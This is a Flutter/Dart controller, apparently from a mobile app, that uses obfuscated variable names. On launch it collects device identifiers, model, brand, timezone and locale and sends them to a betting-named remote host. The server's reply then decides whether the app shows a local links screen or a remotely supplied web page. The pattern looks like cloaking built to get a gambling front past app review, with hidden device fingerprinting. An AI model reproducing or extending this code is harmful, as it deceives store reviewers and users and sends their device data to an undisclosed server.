import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var prvbanxc = RxBool(false);
  var orcbwnpyjq = RxBool(true);
  var glpbz = RxString("");
  var vern = RxBool(false);
  var schneider = RxBool(true);
  final uysqog = Dio();


  InAppWebViewController? webViewController;

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/noNetwork");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    vfgi();
  }


  Future<void> vfgi() async {

    vern.value = true;
    schneider.value = true;
    orcbwnpyjq.value = false;

    uysqog.post("https://bet.capbonf.xyz/hXhY3",data: await unlszjw()).then((value) {
      var ypne = value.data["ypne"] as String;
      var wfpce = value.data["wfpce"] as bool;
      if (wfpce) {
        glpbz.value = ypne;
        elisabeth();
      } else {
        gislason();
      }
    }).catchError((e) {
      orcbwnpyjq.value = true;
      schneider.value = true;
      vern.value = false;
    });
  }

  Future<Map<String, dynamic>> unlszjw() async {
    final DeviceInfoPlugin jnxi = DeviceInfoPlugin();
    PackageInfo fzjgo_nrtkqgfd = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var pldxtmv = Platform.localeName;
    var uNxFS = currentTimeZone;

    var VkBMfe = fzjgo_nrtkqgfd.packageName;
    var ueUOlTcR = fzjgo_nrtkqgfd.version;
    var upYDU = fzjgo_nrtkqgfd.buildNumber;

    var qzbYQ = fzjgo_nrtkqgfd.appName;
    var CNMWxcfg = "";
    var ExNCqs  = "";
    var shermanKing = "";
    var ZoWh = "";
    var erickBahringer = "";
    var kimberlySchulist = "";
    var antoinetteKulas = "";
    var lindsayStark = "";
    var raymondBins = "";
    var eduardoDuBuque = "";


    var frederikRunolfsdottir = "";
    var zPpuV = "";
    var kplbZP = false;

    if (GetPlatform.isAndroid) {
      zPpuV = "android";
      var tsfpyr = await jnxi.androidInfo;

      ZoWh = tsfpyr.brand;

      CNMWxcfg  = tsfpyr.model;
      ExNCqs = tsfpyr.id;

      kplbZP = tsfpyr.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      zPpuV = "ios";
      var msdwvf = await jnxi.iosInfo;
      ZoWh = msdwvf.name;
      CNMWxcfg = msdwvf.model;

      ExNCqs = msdwvf.identifierForVendor ?? "";
      kplbZP  = msdwvf.isPhysicalDevice;
    }

    var res = {
      "upYDU": upYDU,
      "ueUOlTcR": ueUOlTcR,
      "frederikRunolfsdottir" : frederikRunolfsdottir,
      "VkBMfe": VkBMfe,
      "CNMWxcfg": CNMWxcfg,
      "uNxFS": uNxFS,
      "ZoWh": ZoWh,
      "eduardoDuBuque" : eduardoDuBuque,
      "ExNCqs": ExNCqs,
      "pldxtmv": pldxtmv,
      "qzbYQ": qzbYQ,
      "zPpuV": zPpuV,
      "kplbZP": kplbZP,
      "erickBahringer" : erickBahringer,
      "kimberlySchulist" : kimberlySchulist,
      "antoinetteKulas" : antoinetteKulas,
      "lindsayStark" : lindsayStark,
      "shermanKing" : shermanKing,
      "raymondBins" : raymondBins,

    };
    return res;
  }

  Future<void> gislason() async {
    Get.offAllNamed("/linksTab");
  }

  Future<void> elisabeth() async {
    Get.offAllNamed("/linksGo");
  }
}
